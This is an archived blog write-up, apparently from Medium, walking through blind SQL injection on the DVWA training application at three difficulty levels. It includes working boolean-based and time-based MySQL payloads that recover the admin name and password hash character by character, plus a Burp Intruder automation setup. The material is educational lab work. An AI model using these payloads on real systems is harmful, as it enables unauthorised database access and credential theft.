# Blind SQL Injection Walkthrough — DVWA (Low, Medium, High)

- **Source URL:** https://medium.com/@vaishnavkp1998/blind-sql-injection-walkthrough-dvwa-low-medium-high-4044a1c85df1?source=rss------bug_bounty-5
- **Fetched from:** https://web.archive.org/web/20251002205432/https://medium.com/@vaishnavkp1998/blind-sql-injection-walkthrough-dvwa-low-medium-high-4044a1c85df1?source=rss------bug_bounty-5
- **Fetched:** 2026-11-25
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/11145 (id 11145)
- **Method:** trafilatura readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
# Blind SQL Injection Walkthrough — DVWA (Low, Medium, High)

### Introduction

In this write-up we’ll walk DVWA’s Low → Medium → High blind SQLi scenarios. You’ll learn the principles behind boolean-based and time-based exploitation, see practical payloads and automation tips. This is an educational lab guide for safe, legal testing — always get explicit permission before testing on live systems.

### What is Blind SQL injection?

Blind SQL injection is a stealthy, high-impact class of SQL injection where the application gives you no direct data back. Unlike “classic” SQLi, which returns query results or error messages you can read, a blind vulnerability forces you to ask yes/no questions (boolean-based) or measure subtle differences in response time (time-based) to infer what’s in the database. It’s like interrogating the database through a locked door — no direct answers, only clues.

This makes blind SQLi harder to spot and more durable in the wild: many modern apps suppress errors and sanitize output, so attackers resort to logical tests and timing delays to extract usernames, hashes, and configuration values one bit at a time. Because each bit of information requires a separate request, blind attacks can be slow and noisy — but with the right techniques they’re powerful enough to fully compromise back-end data.

a.) *Boolean-based blind:* Send queries that evaluate to true/false and infer data from differences in page content or behavior.

b.) *Time-based blind:* Use database sleep/delay functions to infer data by measuring response time differences.

### Step-by-step Exploitation

**LOW (boolean blind)**

On this page, the `userid` field behaves like a simple boolean oracle: when you enter integers `1`–`5` the page replies **“User ID exists in the database.”**, and when you enter higher numbers like `6`, `7`, etc. it replies **“User ID is MISSING from the database.”**. That behavior comes from the backend query:

`SELECT first_name, last_name FROM users WHERE user_id = '$id';`
If the `WHERE` clause matches a row (e.g. `user_id = 1`), the application treats that as “exists”; if it matches no rows (e.g. `user_id = 6`) the clause is false and the app reports “missing.” Because the app only tells you existence vs. absence, this parameter is a perfect **boolean blind** SQL injection vector: by injecting expressions that evaluate to true or false (for example 

`1' AND'1'='1'#`vs `1' AND '1'='2'#`) you can turn the page’s responses into yes/no answers and thus infer database content one bit at a time.

**Confirm injection**

Payload (always-true):

`1' AND'1'='1'#`
If submitted as the `userid` value, the WHERE clause becomes true and the page returns **"User ID exists...".**

Payload (always-false):

`1' AND '1'='2'#`
This should return **“User ID is MISSING…”**. If you see these differing responses, the parameter is injectable and acts as a boolean oracle.

**Use boolean tests to extract data (character-by-character)**

You can ask yes/no questions about the database, for example: “Is the first character of the first\_name for user\_id=1 equal to ‘a’?”

Payload:

`1' AND SUBSTRING((SELECT first_name FROM users LIMIT 1), 1, 1) = 'a'#`
**Breakdown of our payload:**

If you supply this payload, the query becomes:

`SELECT first_name, last_name FROM users WHERE user_id = '1' AND SUBSTRING((SELECT first_name FROM users LIMIT 1), 1, 1) = 'a'#';`
1. `'1'` closes the string.
2. `#` comments out the rest, so the trailing `'` is ignored.
3. **Inner subquery**

`(SELECT first_name FROM users LIMIT 1)`
a.) This pulls the **first** `first_name` entry from the `users` table.

b.) `LIMIT 1` makes sure only one value is returned.

4\. **SUBSTRING function**

`SUBSTRING(…, 1, 1)`
a.) Takes the result of the subquery.

b.) `1, 1` means: start at position **1** and return **1 character**.

c.) So if the first\_name is `"alice"`, this returns `"a"`.

5\. **Boolean test**

`= 'a'`
a.) Compares the single extracted character with `'a'`.

b.) If the first character **is** `a`, condition = TRUE.

c.) If not, condition = FALSE.

6\. **Result**

a.) If TRUE → the whole `WHERE` clause is satisfied → page shows **"User ID exists..."**.

b.) If FALSE → no row matches → page shows **“User ID is missing…”**.

**As a whole this payload closes the injected string, adds a boolean test that checks whether the first character of the first first\_name in the users table equals 'a', and comments out the remainder — returning "exists" if true and "missing" if false.**

By changing the comparison character (`'a'`, `'b'`, `'c'` …) and position (`SUBSTRING(...,2,1)`, `...,3,1`, etc.), you can extract the value of `first_name` one character at a time.

**Lets confirm our payload works**

Find length (CHAR\_LENGTH) of the first\_name so you know how many characters to extract:

`1' AND CHAR_LENGTH((SELECT first_name FROM users LIMIT 1)) = 5#`
If this returns “User ID exists…”, the name length is 5.

Now we need to find each 5 characters of the first name of the first user in the database one by one.

Find the 1st character.

For this, use the payload

`1' AND SUBSTRING((SELECT first_name FROM users LIMIT 1), 1, 1) = 'a'#`
We can see that page responded with a **“User ID exists…”**.

Change the payload to:

`1' AND SUBSTRING((SELECT first_name FROM users LIMIT 1), 1, 1) = 'b'#`
Page shows **“User ID is missing…”**.

Repeat it with `'b'` replaced by every letter (`'c'`…`'z'`) to determine which character returns a true response (**User ID exists…**)."

After testing `a`–`z`, every payload returned **"User ID is MISSING from the database."** except the one with `'a'`, which returned **"User ID exists in the database."**, confirming the first character is **a**

Now find the **second** character by repeating the same process used for the first character, but change the `SUBSTRING` call to start at position `2` (e.g. `SUBSTRING(..., 2, 1)`) and test each letter until one returns **"exists"**.

`1' AND SUBSTRING((SELECT first_name FROM users LIMIT 1), 2, 1) = 'a'#`
We observe that only the test with `'d'` returned **"User ID exists"**, confirming that the second character is **d**

So far, we have identified the first two characters as **a** and **d**. To uncover the remaining three characters, we follow the same approach: set the starting position to **3** and test letters from **a–z** until one returns **“exists”** (which gives the third character). Next, change the starting position to **4** and repeat the process, and then again for **5**. This way, each position reveals its corresponding character one by one.

Following this process, the remaining three characters are identified as **m**, **i**, and **n**, which together complete the first\_name as **admin**.

**Find the user’s password**

Now we need to find out that admin’s password.

To confirm whether a **password**`users` table, inject:

```
1' AND (SELECT COUNT(*) FROM information_schema.columns 
       WHERE table_schema = database() AND table_name = 'users' 
       AND column_name = 'password') > 0 #
```
If the page returns **“User ID exists in the database.”** the `password` column is present; if it returns **"User ID is MISSING from the database."** it is not.

This confirms that there exists a `password` column.

To check whether **admin**’s password is longer than 10 characters, inject:

`1' AND LENGTH((SELECT password FROM users WHERE first_name = 'admin')) > 10#`
We find that the password length is longer than 10. Go forward by incrementing by 1 from 10 (11, 12, 13, etc) until we get a **“User ID is MISSING from the database.”**

Then we understand the error message comes for the number 32. We confirm that by:

`1' AND LENGTH((SELECT password FROM users WHERE first_name = 'admin')) = 32#`
We discovered the password length is **32**; to extract it character-by-character inject the boolean test (replace `{pos}` and `{char}` and iterate `{pos}=1..32` across your charset), for example for position 1 checking `'a'`:

`1' AND SUBSTRING((SELECT password FROM users WHERE first_name = 'admin'), {pos}, 1) = '{char}'#`
Eg (pos 1 = ‘a’):

`1' AND SUBSTRING((SELECT password FROM users WHERE first_name = 'admin'), 1, 1) = 'a'#`
Repeat with `{char}` = `a`…`z`,`0`…`9`, and symbols as needed for each `{pos}` from `1` to `32` until the payload returns **"User ID exists..."**, which reveals that character.

Using those position-by-position boolean tests, the first position returned **“exists”** for `'5',`

`1' AND SUBSTRING((SELECT password FROM users WHERE first_name = 'admin'), 1, 1) = '5'#`
the second for `'f',`

`1' AND SUBSTRING((SELECT password FROM users WHERE first_name = 'admin'), 2, 1) = 'f'#`
and continuing the same way for each position we recovered the full 32-character password :`5f4dcc3b5aa765d61d8327deb882cf99` .

### MEDIUM

On **Medium**, the app builds the query unquoted as:

`SELECT first_name, last_name FROM users WHERE user_id = $id;`
I confirmed it’s injectable by sending `id=1 AND 1=1#` (returned **"User ID exists..."**) and `id=1 AND 1=2#` (returned **"User ID is MISSING..."**), which proves the `id` parameter acts as a boolean oracle and can be abused for blind SQL injection.

Because the `id` value comes from a **select/form field**, we inject the payload into that parameter in the **captured request** in Burp and then use Burp Intruder to automate boolean or time-based tests.

Next, I tried

`1 AND SUBSTRING((SELECT password FROM users WHERE user_id=1),1,1) = '5'#`
expecting an **“User ID exists”** response (since admin’s password starts with `5` from the Low level), but it failed — however the ASCII-style check did work:

`1 AND ASCII(SUBSTRING((SELECT password FROM users WHERE user_id=1),1,1)) = 53#`
which returned **“User ID exists.” (**The character `'5'` corresponds to the ASCII code **53).**

To extract all 32 characters, I sent the ASCII-based payloads to **Burp Intruder**, iterating through character positions and ASCII values to recover each byte.

1. ) In the request put two markers:

2.) In Positions select **ClusterBomb**.

3.) Payload set 1 (POS): **Numbers** → Start `1`, End `32` (password length), Step `1`.

4.) Payload set 2 (ASCII): **Numbers** → Start `32`, End `126`, Step `1`. These are decimal **ASCII codes**. `32` = space ( ) and `126` = tilde (`~`). Together they cover the entire **printable ASCII** range (all digits, uppercase, lowercase letters, and common symbols).

5.) Use **Grep — Match** to highlight responses containing `"User ID exists..."` so you can spot when a particular (pos,ascii) pair was true.

6.) Start attack — ClusterBomb will try all combinations (POS × ASCII).

After the Intruder run, I sorted the results by character position and mapped each discovered ASCII code back to its corresponding character to recover the full password.

### HIGH

On High the SQL includes `LIMIT 1`, restricting results to a single row

(`SELECT first_name, last_name FROM users WHERE user_id = '$id' LIMIT 1;`), which mitigates attacks that expect multiple rows to appear. Additionally, the UI supplies the `user_id` through a clickable link that spawns a new window — you need to intercept the request generated by that link/popup to inject your payload.

Inject the payload:

`1' AND SUBSTRING((SELECT password FROM users where first_name='admin'), 1, 1) = '5'#`
Repeat the same process we used at the Low level — test each position individually and recover each character one by one.

Let’s move into **time-based** blind SQLi.

### Time-based blind sqli

When an application gives no visible differences in page content for true/false tests, you can force the database to *delay* its response when a condition is true and infer data from the increased response time. Time-based SQLi is slower than boolean blind but works when content is identical for both outcomes.

**How it works**

Inject a conditional that calls a sleep/delay function when the test is true. If the HTTP response takes noticeably longer than your baseline, the condition was true; if the response is normal, it was false. Repeat to recover characters one by one (or use binary search on ASCII values to speed it up).

**Payload: (LOW)**

`1' AND IF(SUBSTRING((SELECT password FROM users where first_name='admin'), 1, 1) = 'a', SLEEP(5), 0)#`
This time-based payload checks whether the first character of **admin**’s `password` equals `'a'`; if true the database executes `SLEEP(5)` (causing a measurable delay), otherwise it returns immediately — so you infer the boolean result by observing a long response time.

Repeat the same process for every character, but use the time-based payload variant — instead of reading “exists”/“missing”, observe which requests cause a noticeable response delay (the sleeps indicate a true condition) to recover each character.

For each position `pos=1..32`,test candidate characters (`'a'..'z','0'..'9'`). Record a character when requests for it consistently produce the long delay. Repeat until full value recovered.

**Now I’ll let you handle the Medium and High levels, using time-based blind SQLi to extract the data.**

## Conclusion

Blind SQL injection is a stealthy variant of SQLi where the application does not return query results or error messages directly, forcing an attacker to infer data through indirect signals (boolean responses or timing differences).

This walkthrough showed how blind SQL injection can be exploited across DVWA’s Low → Medium → High settings using two core approaches: **boolean-based** tests and **time-based** tests.

The impact of blind SQLi in real-world systems is serious: attackers can extract credentials, personal data, session tokens, configuration secrets, or even escalate into full system compromise — all without obvious error messages. Beyond data theft, blind techniques can be used to fingerprint schema, discover admin accounts, pivot to other backend services, or trigger secondary attacks (e.g., OOB exfiltration).
